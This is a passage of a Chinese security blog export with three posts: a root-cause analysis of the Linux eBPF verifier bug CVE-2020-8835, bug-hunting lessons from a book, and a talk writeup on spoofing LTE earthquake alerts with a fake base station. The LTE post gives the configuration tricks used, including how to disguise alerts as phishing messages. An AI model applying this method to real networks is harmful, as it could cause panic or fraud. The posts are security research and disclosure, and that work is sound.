<h4 id="eBPF程序的基本功能"><a href="#eBPF程序的基本功能" class="headerlink" title="eBPF程序的基本功能"></a>eBPF程序的基本功能</h4><p>linux <a href="https://www.kernel.org/doc/html/latest/networking/filter.html#networking-filter">官方文档</a>对eBPF模块有个详细的介绍，可以配合本文进行理解。<br>eBPF是对BPF的扩展，BPF即为 Berkeley Packet Filter，顾名思义这个东西主要是用来对网卡进入的数据包进行过滤和拷贝到用户层的。eBPF对BPF很多功能进行了扩展，可以对更多的数据进行过滤，二者的编码方式有所不同，但是基本原理都一样。<br><img src="https://www.ibm.com/developerworks/cn/linux/l-lo-eBPF-history/image002.png"><br>eBPF程序本身包含了一些过滤规则，例如验证包是IP包还是ARP包。  <a href="http://www.tcpdump.org/">tcpDump</a>这个程序底层就是通过BPF实现的包 过滤功能的。</p>
<h4 id="eBPF是如何在内核中运行的"><a href="#eBPF是如何在内核中运行的" class="headerlink" title="eBPF是如何在内核中运行的"></a>eBPF是如何在内核中运行的</h4><p>eBPF程序是使用一种低级的机器语言编写的，类似于汇编指令，例如下面这样</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),</span><br><span class="line">BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -8),</span><br><span class="line">BPF_LD_MAP_FD(BPF_REG_1, 0),</span><br><span class="line">BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_lookup_elem),</span><br><span class="line">BPF_EXIT_INSN(),</span><br></pre></td></tr></table></figure>
<p>但是他并不会被编译器提前编译为可执行文件然后交给内核执行，而是直接以这种类似汇编形式的语言经过一些编码（非编译）交给内核中的虚拟机执行。<br>内核中是实现了一个小型的虚拟机负责动态的解析这些eBPF程序。也许有同学会思考为什么要用一个虚拟机去动态执行解析这些eBPF程序，而不是提前编译，直接执行编译好的过滤程序。<br>对于这个问题我也搜了很多资料，但是并没有直接解答这个疑问的，在这里我提出自己的理解，不能保证正确，欢迎大家批评指正：</p>
<blockquote>
<p>BPF这种通过内核虚拟机执行包过滤规则的设计架构也是参考了别的包过滤器的。动态执行这种设计更加适合包过滤这种业务场景，由于包过滤的规则变化很快，而且可以很复杂，而且逻辑执行深度和数据包本身的字段内容强相关的，如果提前编译，可能有很大一块逻辑都不会执行，那么编译是完全浪费时间的，如果能够根据包本身的信息，对过滤代码动态编译就会节省很多时间，也更加灵活，所以最终采用了内核虚拟机动态解析过滤规则的方式实现BPF。</p>
</blockquote>
<h4 id="一个具体的BPF程序对数据包类别判断的例子"><a href="#一个具体的BPF程序对数据包类别判断的例子" class="headerlink" title="一个具体的BPF程序对数据包类别判断的例子"></a>一个具体的BPF程序对数据包类别判断的例子</h4><p>例如下面这段代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ldh [12]</span><br><span class="line">jne #0x800, drop</span><br><span class="line">ret #-1</span><br><span class="line">drop: ret #0</span><br></pre></td></tr></table></figure>
<p>这段代码的意思是从数据包的偏移12个字节的地方开始读取一个half word就是16个字节，然后判断这个值是否是0x806,如果不是，就执行drop，否则执行返回-1。<br>这个代码就是实现了判断包是否是IPv4包的功能，我们通过wireshark抓包可以发现<br> <img src="http://note.youdao.com/yws/public/resource/957bc9fdc978e1baf81d64a85ef5dceb/xmlnote/CF8CEB5991B4465093C1DC5419AECC0E/68212" alt="image"><br>在数据包偏移12字节的地方就是以太网头中Type字段。通过这个例子我们可以更加具体的了解BPF程序的工作原理。</p>
<h4 id="eBPF程序是如何交给内核执行的"><a href="#eBPF程序是如何交给内核执行的" class="headerlink" title="eBPF程序是如何交给内核执行的"></a>eBPF程序是如何交给内核执行的</h4><p>eBPF程序虽然是有内核的虚拟机负责执行的，但是eBPF程序的编写确实完全由用户定义的，因此这也是eBPF模块是一个理想的内核提权攻击面的根本原因。<br>eBPF程序通过BPF系统调用，cmd为BPF_PROG_LOAD就可以将eBPF程序发送给内核，还可以通过cmd为BPF_MAP_CREATE系统调用创建一个map数据结构，这个map数据结构就是用户侧运行的程序与内核中运行的eBPF程序进行数据交互的地方。其简要原理图为<br><img src="https://p2.ssl.qhimg.com/t0106b522dafac23033.png"></p>
<hr>
<h2 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02 漏洞分析"></a>0x02 漏洞分析</h2><p>通过上面对eBPF程序的设计架构和运行原理介绍之后，我们就可以对一个具体的eBPF提权漏洞CVE-2020-8835进行分析，披露这个漏洞的文章也出现了很多，本文更加侧重对漏洞原理的解释，希望读者能够掌握漏洞原理，能够对eBPF这个攻击面的安全性有更深入的思考，最好是也能挖到类似的漏洞。</p>
<h4 id="漏洞位置"><a href="#漏洞位置" class="headerlink" title="漏洞位置"></a>漏洞位置</h4><p>CVE-2020-8835漏洞所涉及的函数为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">static void __reg_bound_offset32(struct bpf_reg_state *reg)</span><br><span class="line">&#123;</span><br><span class="line">	u64 mask = 0xffffFFFF;</span><br><span class="line">	struct tnum range = tnum_range(reg-&gt;umin_value &amp; mask,</span><br><span class="line">				       reg-&gt;umax_value &amp; mask); // -----&gt;1</span><br><span class="line">	struct tnum lo32 = tnum_cast(reg-&gt;var_off, 4);</span><br><span class="line">	struct tnum hi32 = tnum_lshift(tnum_rshift(reg-&gt;var_off, 32), 32);</span><br><span class="line"></span><br><span class="line">	reg-&gt;var_off = tnum_or(hi32, tnum_intersect(lo32, range));</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>初看这个函数，很难理解tnum，mask，tnum_range，tnum_cast这些函数的作用，尽管ZDI博文中给了相关的解释，但我觉着还是对不了解eBPF模块的人不够友好，读完还是让人无法理解。由于这个漏洞和业务逻辑强相关，因此要想掌握漏洞原理，就必须能够理解代码的逻辑功能是什么，而代码中的tnum结构的数据类型是阻碍理解逻辑功能的关键。下面，本文将围绕tnum这个数据结构对此漏洞的根因进行分析。</p>
<h4 id="Verifier"><a href="#Verifier" class="headerlink" title="Verifier"></a>Verifier</h4><p>漏洞函数__reg_bound_offset32所在文件为verifier.c，verifier.c文件实现了上图中Verifier的功能。eBPF是用户侧编写的程序，但是却在内核虚拟机中执行，这显然是非常危险的，为了能够保障内核数据不被篡改和泄露，eBPF在真正被虚拟机执行之前都会被Verifier检查，Verifier会对eBPF指令的类型，跳转，是否有循环，以及操作数的取值范围进行检查，只有通过检查的eBPF的指令才可以被执行。<br>那么Verifier到底是如何保证不会有OOB这种情况发生的呢？<br>eBPF程序的每个操作数的属性都会被<code>bpf_reg_state</code> 数据结构进行追踪<br><code>bpf_reg_state</code> 的结构如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">enum bpf_reg_type type;</span><br><span class="line">  union &#123;</span><br><span class="line">      u16 range;</span><br><span class="line">      struct bpf_map *map_ptr;</span><br><span class="line">      u32 btf_id;</span><br><span class="line">      unsigned long raw;</span><br><span class="line">  &#125;;</span><br><span class="line">  s32 off;</span><br><span class="line">  u32 id;</span><br><span class="line">  u32 ref_obj_id;</span><br><span class="line">  struct tnum var_off;</span><br><span class="line">  s64 smin_value;</span><br><span class="line">  s64 smax_value;</span><br><span class="line">  u64 umin_value;</span><br><span class="line">  u64 umax_value;</span><br><span class="line">  struct bpf_reg_state *parent;</span><br><span class="line">  u32 frameno;</span><br><span class="line">  s32 subreg_def;</span><br><span class="line">  enum bpf_reg_liveness live;</span><br><span class="line">  bool precise;</span><br></pre></td></tr></table></figure>
<p>可以看到对于每一个操作数，它的类型，值，取值范围都有详细的变量在追踪。常见的操作类型有PTR指针类型，或者Scalar这种常量类型的数据，为了防止越界，Verifier禁止了很多类型的操作，比如禁止两个PTR类型的操作数运算，但是允许PTR类型与Scalar类型的操作数运算。即使允许PTR类型与Scalar类型操作，也不能保证安全性，因为如果Scalar比较大的话，还是可以导致OOB，所以Verifier通过设置取值范围的方式来进行校验，如果操作数在运算后超过了被设定的最大最小值范围，也会被禁止。<br>我们可以看到<code>bpf_reg_state</code>还定义了一个tnum变量，这个变量注释说是获得操作数各个位的信息的情况的，value，mask两个字段一起表达操作数各个位的0,1，或者未知的三种状态的。</p>
<h4 id="tnum数据结构的逻辑意义"><a href="#tnum数据结构的逻辑意义" class="headerlink" title="tnum数据结构的逻辑意义"></a>tnum数据结构的逻辑意义</h4><p>tnum是为了描述那些不能有明确值的操作数，那么什么情况下操作数的值是不能确定的呢，例如从一个packet中读取一个half word，这个值就是不能确定。而如果直接读取一个立即数，这种值就是确定的。对于这种不能确定的操作数，就可以用umax,umin,smax,smin这几种变量表示有符号和无符号的最大最小值，tnum描述他们的每个位的信息。总之配合最大最小值，tnum可以尽可能的对一个未知的变量进行预测。并且伴随着eBPF指令的执行，还会对tnum，最大最小值进行更新，举个例子</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if reg_0 &lt; 7    // 有符号比较</span><br><span class="line">   reg_1 = reg_0</span><br><span class="line">else</span><br><span class="line">   reg_1 = 1</span><br></pre></td></tr></table></figure>
<p>在这个例子中，reg_0这个操作数会被跟踪，如果它小于7，则可以对reg_0的最大值进行设置，最大值为7-1=6， 同时也得出高位都是0，所以也可以对tnum进行设置。本文的<code>__reg_bound_offset32</code>函数就是负责处理tnum与最大最小值同步更新的工作的。</p>
<p>tnum到底是如何描述未知值的？<br>假设拿到一个寄存器，这个寄存器就是不是一个确定值，用tnum表示他的位的状态，比如64位的一个数，那么某一位只可能三种状态，确定的0，确定的1，或者不知道是啥，就是这种数据结构是某个位有三种状态，而不是2种状态。  </p>
<p>单纯的用一个64位的数据是不可能表达这种数据结构的，这种数据结构有3的64次方，而64位的二进制只有2的64方，但是如果有两个64位的数据就可以表达这个64位的三进制数据，2的128次方。</p>
<p>所以就需要一种编码方式，用2个64位数编码这个三进制的数。</p>
<p>而eBPF的tnum的编码方式就是能确定是1的位，就value标识为确定1，而能确定是0的位需要，value位0，并且mask对应位也为0，相当于用2位去表达这个状态，，所以本质是用2位去表达三种状态，就是x1，标识1，01标识0，00标识未知这种本质。</p>
<p>为了精确，模拟了一个mask和value的东西，就是value位能够决定某个位是1，对应mask位的值必须为0（有一个规定就是不能同时为1），而对于确定是0的位，则必须value位为0，mask也要为0，对于unknown的状态，需要value为0，而mask为1<br> 所以最终的表达为<br> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">value  mask    预测值</span><br><span class="line">0      0       0</span><br><span class="line">1      0       1</span><br><span class="line">0      1       unknown</span><br><span class="line">1      1       禁止出现</span><br></pre></td></tr></table></figure></p>
<h4 id="reg-bound-offset32漏洞函数解析"><a href="#reg-bound-offset32漏洞函数解析" class="headerlink" title="__reg_bound_offset32漏洞函数解析"></a>__reg_bound_offset32漏洞函数解析</h4><p>除了<code>__reg_bound_offset32</code>还有一个<code>__reg_bound_offset</code>函数，这个函数功能更加简洁</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">static void __reg_bound_offset(struct bpf_reg_state *reg)</span><br><span class="line">&#123;</span><br><span class="line">	reg-&gt;var_off = tnum_intersect(reg-&gt;var_off,</span><br><span class="line">				      tnum_range(reg-&gt;umin_value,</span><br><span class="line">						 reg-&gt;umax_value));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>__reg_bound_offset32</code>是一种特殊情况，只有当操作数已经明知是32位的才会执行，而对于一般的是默认执行<code>__reg_bound_offset</code>操作，我们可以先从<code>__reg_bound_offset</code>去推测 __reg_bound_offset32的大概意义。<br><code>tnum_intersect</code>函数的输入是两个tnum的变量，根据名字和源码我们可以简要总结：当有两个tnum对同一个操作数进行描述的时候，可以结合两个tnum的信息，这样可以对这个操作数的描述更加精确，结合的规则就是，如果一个tnum的某个位已知，另外一个tnum的对应位为未知，那么结合后新tnum对应位则是已知的。</p>
<p><code>tnum_range</code> 函数作用是，根据一个更新后的最大最小值得到一个tnum。这个tnum可以与目标操作数的tnum进行tnum_intersect，相当于融合了最大最小值的信息，这样可以实现对原来的操作数进行更准确的预测更新。</p>
<p>所以根据<code>__reg_bound_offset</code>的作用，我们知道了主要目的就是根据最大最小值对原来操作数的tnum进行更加准确的预测。那么<code>__reg_bound_offset32</code>又有什么不同呢？</p>
<p><code>__reg_bound_offset32</code> 源码如下:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">static void __reg_bound_offset32(struct bpf_reg_state *reg)</span><br><span class="line">&#123;</span><br><span class="line">	u64 mask = 0xffffFFFF;</span><br><span class="line">	struct tnum range = tnum_range(reg-&gt;umin_value &amp; mask,</span><br><span class="line">				       reg-&gt;umax_value &amp; mask); // -----&gt;1</span><br><span class="line">	struct tnum lo32 = tnum_cast(reg-&gt;var_off, 4);</span><br><span class="line">	struct tnum hi32 = tnum_lshift(tnum_rshift(reg-&gt;var_off, 32), 32);</span><br><span class="line"></span><br><span class="line">	reg-&gt;var_off = tnum_or(hi32, tnum_intersect(lo32, range));</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>我们利用理解<code>tnum_range</code>函数的方法，可以推得<code>tnum_cast</code>，<code>tnum_lshift</code>，<code>tnum_or</code>的作用，可以感觉出整个函数的目的是同样根据最大最小值对已有的tnum值进行更新。而且，相比于<code>__reg_bound_offset</code>函数，<code>__reg_bound_offset32</code>还有一个隐藏的信息可以对操作数进行更加准确的预测：<br><strong>32位数的最大最小值不会超过0xFFFFFFFF</strong></p>
<p>这个隐藏条件的表达就是 标注1所做的工作，漏洞代码尝试用截断低32位的方式来表达32位数的最大最小值不会超过0xFFFFFFFF，但是实际上这个语句并不能表达这个功能。准确的表达是</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">new_umin_value = min(0xffffffff,umin_value)</span><br><span class="line">new_umax_value = min(0xffffffff,umax_value)</span><br><span class="line"> range  = tnum_range(new_umin_value, new_umax_value)</span><br></pre></td></tr></table></figure>
<p>上面两句话是笔者自己理解的实现32位隐藏条件的代码。</p>
<h4 id="漏洞根因"><a href="#漏洞根因" class="headerlink" title="漏洞根因"></a>漏洞根因</h4><p>正是<code>   struct tnum range = tnum_range(reg-&gt;umin_value &amp; mask,                        reg-&gt;umax_value &amp; mask);</code> 这一条语句导致的漏洞，这句话实现的是截断功能，而不是对于超出32位的数直接取值为0xffff ffff的功能。</p>
<p>由于这个错误的实现导致Veifier并不能正确的验证eBPF指令的执行情况，所以对一些本应该禁止的OOB操作，Verifier还是通过了检查，最终可以实现对内核数据的越界读写。</p>
<h2 id="0x03-小结"><a href="#0x03-小结" class="headerlink" title="0x03 小结"></a>0x03 小结</h2><p>这个漏洞的Root Cause是和漏洞函数的业务功能逻辑强相关的，如果不理解代码的目的，很难对这个漏洞的根本原因理解，而由于eBPF的执行流程又比较特别，需要对背景知识，设计架构，运行机理有一定的了解才能够推理出漏洞函数的功能。为了能够让不熟悉eBPF的同学能够更加快速的了解eBPF，接触eBPF这一个理想的内核攻击面。eBPF程序由用户定义，但是在内核中执行，这是eBPF模块是一个值得重视的内核攻击面的根本原因。希望本文提供的思维路线，能够帮助到大家。</p>
<h2 id="0x04-参考"><a href="#0x04-参考" class="headerlink" title="0x04 参考"></a>0x04 参考</h2><p>1 <a href="https://www.kernel.org/doc/html/latest/networking/filter.html#networking-filter">https://www.kernel.org/doc/html/latest/networking/filter.html#networking-filter</a><br>2 <a href="https://www.thezdi.com/blog/2020/4/8/cve-2020-8835-linux-kernel-privilege-escalation-via-improper-ebpf-program-verification">https://www.thezdi.com/blog/2020/4/8/cve-2020-8835-linux-kernel-privilege-escalation-via-improper-ebpf-program-verification</a><br>3 <a href="https://www.anquanke.com/post/id/203416">https://www.anquanke.com/post/id/203416</a><br>4 <a href="https://colorlight.github.io/2020/10/10/%E6%8D%89%E8%99%AB%E6%97%A5%E8%AE%B0%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/">https://colorlight.github.io/2020/10/10/捉虫日记漏洞总结/</a></p>
<h2 id="版权声明"><a href="#版权声明" class="headerlink" title="版权声明"></a>版权声明</h2><p>本文作者Colorlight 本篇文章首发于安全客 <a href="https://www.anquanke.com/post/id/220047">https://www.anquanke.com/post/id/220047</a></p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>eBPF</tag>
      </tags>
  </entry>
  <entry>
    <title>捉虫日记漏洞总结</title>
    <url>/2020/10/10/%E6%8D%89%E8%99%AB%E6%97%A5%E8%AE%B0%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近阅读了捉虫日记这本少有的讲述漏洞挖掘方法的书籍，本书虽然只有7个漏洞，但是对每个漏洞到底是如何发现的做了很详细的说明，还原了漏洞挖掘的思维过程，笔者认为这是本书最有价值的一块内容，现在大部分的文章都是讲述了漏洞原理但是对于漏洞是如何发现的内容涉及很少。漏洞的发现过程是比较琐碎的，甚至难以回忆，很容易忘记当时的发现的思路历程，所以比较难成文，笔者也将努力将原书中我比较喜欢的几个漏洞的ROOT CAUSE和如何找到做一些简单的总结。</p>
<h2 id="0x00-ESCAPE-FROM-WWW-ZONE漏洞"><a href="#0x00-ESCAPE-FROM-WWW-ZONE漏洞" class="headerlink" title="0x00 ESCAPE FROM WWW ZONE漏洞"></a>0x00 ESCAPE FROM WWW ZONE漏洞</h2><ul>
<li><p>ROOT CAUSE<br>由于有错误条件是两个方式共同表示的，返回值和一个参数值，当出现错误条件的时候，只设置了其中一个条件（返回值）忘记设置了参数，由于对同一个错误状态的两种表达方式不同步，最终导致这个oob</p>
</li>
<li><p>如何发现这个漏洞</p>
<ol>
<li>观察错误条件是否是两个因素或者多个因素决定的，对于这种编程范式就可以好好审计</li>
<li>构造好fuzz条件，fuzz 输入payload</li>
</ol>
</li>
</ul>
<h2 id="0x01-NULL-POINTER-FTW漏洞"><a href="#0x01-NULL-POINTER-FTW漏洞" class="headerlink" title="0x01 NULL POINTER FTW漏洞"></a>0x01 NULL POINTER FTW漏洞</h2><ul>
<li><p>ROOT CAUSE<br>由于对长度信息的处理不恰当，将一个unsigned 类型直接赋值给 有符号的变量，对这个长度信息所做的任何判断大小比较都会存在风险。</p>
</li>
<li><p>如何发现这漏洞<br>对于TLV格式的数据，定位抽取长度的变量，观察这个变量是否赋给了有符号的变量，不需要对所有的类型转换进行审计，只需要对这种标识长度的变量的类型转换进行审计就行。这种有符号的比较大小本身就是容易出问题，有符号的比较就要考虑到小于0的情况</p>
</li>
<li><p>漏洞利用<br>造成的是NULL pointer derefernce，但是这个并不是制造成了dos，还造成了控制ip，由于这个空指针应用的偏移是可控的，所以可以落到got表中，对got表的修改，即可以在紧接着的call 目标got表函数时造成劫持</p>
</li>
</ul>
<h2 id="0x02-ONE-KERNEL-TO-RULE-THEM-ALL-漏洞"><a href="#0x02-ONE-KERNEL-TO-RULE-THEM-ALL-漏洞" class="headerlink" title="0x02 ONE KERNEL TO RULE THEM ALL 漏洞"></a>0x02 ONE KERNEL TO RULE THEM ALL 漏洞</h2><ul>
<li>ROOT CAUSE<br>memcpy函数的第一个参数是任意可变的，即使n是固定值，直接实现了write what where</li>
<li>如何发现这个漏洞<ol>
<li>作者还是通过跟踪数据流向的方法在静态的审计函数的处理流程，重点关注了与长度相关的处理逻辑，但是这个漏洞不需要dst与n的不同步即可触发，或者可以理解为是不同步的一种特殊情况，由于dst是任意的，所以永远与n不同步。</li>
<li>除了仔细审计与长度相关的代码，还需要注意的是当涉及到与memcpy这种dst，src，和copy数目相关的函数的时候，一定要重点关注dst和num这两个值，要关注dst的来源是什么，是否和num同步，是否可能造成溢出，像这个漏洞是否dst是直接由用户指定的，这都是根据dst的来源而定的</li>
</ol>
</li>
</ul>
<h2 id="0x03-A-BUG-OLDER-THAN-4-4BSD-漏洞"><a href="#0x03-A-BUG-OLDER-THAN-4-4BSD-漏洞" class="headerlink" title="0x03 A BUG OLDER THAN 4.4BSD 漏洞"></a>0x03 A BUG OLDER THAN 4.4BSD 漏洞</h2><ul>
<li>ROOT CAUSE<br>从payload中转化的长度信息，赋值给了有符号数，对有符号的比较，比较绕过，导致越界的访问</li>
<li>如何发现这个漏洞<ol>
<li>在追踪数据流的时候，不仅对数据的长度信息关注，还需要对任何数目相关的字段关注，这些字段的比较大小是容易出错的</li>
<li>特别这些数目是有符号数的比较，是非常危险的，一定要注意小于0的情况是否是预期内的</li>
</ol>
</li>
</ul>
<h2 id="0x04-THE-RINGTONE-MASSACRE漏洞"><a href="#0x04-THE-RINGTONE-MASSACRE漏洞" class="headerlink" title="0x04 THE RINGTONE MASSACRE漏洞"></a>0x04 THE RINGTONE MASSACRE漏洞</h2><ul>
<li>Fuzz方法<br>变异策略<ul>
<li>通过对一个合法的文件格式进行逐个字节的0xff替换</li>
<li>这种变异策略是相对高效的，可以找到一些简单的有关长度的漏洞，而且不需要对格式协议有详细的了解，smb也可以尝试利用同样的方法进行一些测试。</li>
</ul>
</li>
</ul>
<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>本文主要是对书中几个漏洞的根因进行了提炼，对根因的理解抽象才能够举一反三，所以漏洞原因也尽量精简，笔者也在整理漏洞挖掘方法，但是由于分析的漏洞数量不够多，还不好拿出分享，等到分析足够多的漏洞，到时会以makdown map的形式展示出。<br>以后也会经常以本篇文章的形式分析一系列漏洞。</p>
<h2 id="版权声明"><a href="#版权声明" class="headerlink" title="版权声明"></a>版权声明</h2><p>本文作者为colorlight，转载请注明出处 <a href="https://colorlight.github.io">https://colorlight.github.io</a></p>
]]></content>
      <categories>
        <category>漏洞挖掘方法</category>
      </categories>
      <tags>
        <tag>如何发现漏洞</tag>
        <tag>ROOT CAUSE</tag>
        <tag>Fuzz 变异策略</tag>
      </tags>
  </entry>
  <entry>
    <title>伪造LTE地震海啸警报</title>
    <url>/2020/07/29/%E4%BC%AA%E9%80%A0LTE%E5%9C%B0%E9%9C%87%E6%B5%B7%E5%95%B8%E8%AD%A6%E6%8A%A5/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这是我在2019年的HITB和DEFCON China的议题的解读，现在同步到我的blog上</p>
<h2 id="议题摘要"><a href="#议题摘要" class="headerlink" title="议题摘要"></a>议题摘要</h2><p>本议题将讨论LTE协议中与PWS(Public Warning System公共预警系统)相关的安全漏洞。 PWS是向公众播报地震海啸以及其他紧急事件的预警系统，在灾难发生前，PWS系统可以为人民的生命安全争取极其宝贵的时间。<br>我们仔细研究了LTE协议中与PWS相关部分，发现LTE空口中承载的预警信息是不经过加密以及完整性保护的，我们通过常用的软件无线电设备即可以仿造虚假的灾难预警信息，并且成功的迫使支持PWS的Android和iPhone手机发出灾难警报。通过对LTE协议中参数的精心配置，我们还实现了将灾难警报信息伪装成诈骗钓鱼以及广告短信的形式。最后我们提出了一些相应的解决办法，来防止PWS系统沦为摆设甚至成为电信诈骗的工具。</p>
<h2 id="议题解析"><a href="#议题解析" class="headerlink" title="议题解析"></a>议题解析</h2><p>3GPP协议中规定了4种公共警报系统，分别是日本的ETWS，美国的CMAS，韩国的KPAS以及欧洲的EU-Alert。由于各个国家的安全要求不同，因此标准化工作较为困难。为了避免系统复杂性，防止漫游到其他国家手机不能正常接收警报信息，目前的标准中并未加入对警报信息的签名等验证信息。<br><img src="/images/lte/clipboard1.png"/><br><img src="/images/lte/clipboard2.png"/><br>我们利用软件无线电设备USRP B210和开源的LTE测试平台srsLTE搭建LTE伪基站。为了不干扰正常用户的通信，我们的实验选择在了电磁屏蔽屋内进行。<br><img src="/images/lte/clipboard3.png"/><br>为了能够使手机发起小区重选流程，我们搭建的伪基站的参数要尽量模仿合法基站的设置，可以利用一些常用的路测软件获取当前基站的参数，如TAC PCI以及下行频点号。<br><img src="/images/lte/clipboard4.png"/><br>由于LTE的小区重选机制相对于GSM等系统较为严格，即使信号强度高于合法基站，仍然难以触发手机的小区重选，我们可以选在优先频点或者将物理小区号设置成与合法基站相同的以增加接入成功率。<br><img src="/images/lte/clipboard5.png"/><br>为了避免手机发起鉴权流程，要将TAC设置成与合法基站一样的，手机无法发起位置区更新，则不会对伪基站的合法性进行甄别。<br><img src="/images/lte/clipboard6.png"/><br>LTE协议中直接携带警报信息内容的是系统广播信息System information，其中SIB 10携带的是日本的ETWS的第一级警报信息，此信息仅包含固定的警报消息类型，如地震海啸或者其他紧急警报。SIB 11中携带的是ETWS的第二级警报信息，包含具体的警报内容，如地震中心，地震强度等，此信息是自定义的。SIB 12是携带的CMAS KPAS和EU-ALERT警报消息。<br>由于ETWS相较于其他系统分为两个等级的警报信息，较为复杂，我们以ETWS为例进行伪造警报消息。<br><img src="/images/lte/clipboard7.png"/><br>除了SIB10 SIB11直接携带警报消息外，SIB 1负责对SIB10以及SIB11的调度，paging消息负责向用户手机提示有警报消息需要接收。<br><img src="/images/lte/clipboard8.png"/><br>由于srsLTE中没有针对SIB10的定义与实现，我们需要比照协议对SIB10进行构造，其中messageIdentifer字段标识了消息类型，地震警报需要将此值设置为0x1102。其他参数的具体配置可以参看截图。<br><img src="/images/lte/clipboard9.png"/><br>我们需要在srsLTE源码中添加对paging消息的修改，使paging消息中增加对ETWS警报信息的指示。<br><img src="/images/lte/clipboard10.png"/><br>其实我们不仅可以利用ETWS消息发送地震警报，我们甚至可以它改造成一个广告诈骗等垃圾短信。将message identifier字段设置为0x1104就可以使手机不发出警报声，但是仍弹出信息内容。<br><img src="/images/lte/clipboard11.png"/><br>以上是我们在Google Pixel手机上分别伪造的地震警报信息和添加了钓鱼电话的诈骗信息。<br><img src="/images/lte/clipboard12.png"/><br>由于中国没有在手机移动网络中支持公共报警服务，因此国内版的Android手机并不会对伪造的警报信息作出响应，同时国行版的苹果手机也仅在MCC为001,MNC为01的测试网络中对警报信息作出响应。<br><img src="/images/lte/clipboard13.png"/><br>公共警报信息的不加密造成的潜在安全威胁还是较大的，如果在人口密集处如满座的球场内发送警报信息有可能导致踩踏事件。2018年的夏威夷导弹误警报就是基于美国的PWS系统CMAS传播的，这导致了全城的恐慌和社会混乱。<br><img src="/images/lte/clipboard14.png"/><br>目前可以利用非对称加密的机制对警报信息添加签名信息来防止恶意伪造的虚假警报。<br><img src="/images/lte/clipboard15.png"/><br>由于各国对警报消息的要求不同，3GPP的警报的标准化进行较为困难，导致数字签名验证机制并没有作为一种强制执行要求，所以现在的手机均是不验证警报消息的合法性的。</p>
<h2 id="攻击演示"><a href="#攻击演示" class="headerlink" title="攻击演示"></a>攻击演示</h2><iframe width="640" height="360" src="https://www.youtube.com/embed/B1RVA01g3Bg" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>

<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul>
<li><a href="https://conference.hitb.org/hitbsecconf2019ams/sessions/haxpo-this-is-a-public-service-announcement-hacking-lte-public-warning-systems/">HAXPO: This is a Public Service Announcement: Hacking LTE Public Warning Systems</a></li>
<li><a href="https://www.defcon.org/html/dc-china-1/dc-cn-1-speakers.html">WARNING: Magnitude 10 Earthquake Is Coming in One Minute</a></li>
<li><a href="https://www.anquanke.com/post/id/177963">安全客|HITB议题解读 | 伪造LTE地震海啸警信息</a></li>
<li><a href="https://conference.hitb.org/hitbsecconf2019ams/materials/HAXPO%20D1%20-%20Hacking%20LTE%20Public%20Warning%20Systems%20-%20Weiguang%20Li.pdf">HAXPO D1 - Hacking LTE Public Warning Systems - Weiguang Li.pdf</a></li>
</ul>
<h2 id="版权声明"><a href="#版权声明" class="headerlink" title="版权声明"></a>版权声明</h2><p>本文作者为colorlight，首发于安全客<br>转载请注明出处 <a href="https://colorlight.github.io/2020/07/29/%E4%BC%AA%E9%80%A0LTE%E5%9C%B0%E9%9C%87%E6%B5%B7%E5%95%B8%E8%AD%A6%E6%8A%A5/">https://colorlight.github.io/2020/07/29/伪造LTE地震海啸警报/</a></p>
]]></content>
      <categories>
        <category>LTE</category>
      </categories>
      <tags>
        <tag>PWS</tag>
        <tag>LTE安全</tag>
        <tag>伪造地震消息</tag>
      </tags>
  </entry>
</search>
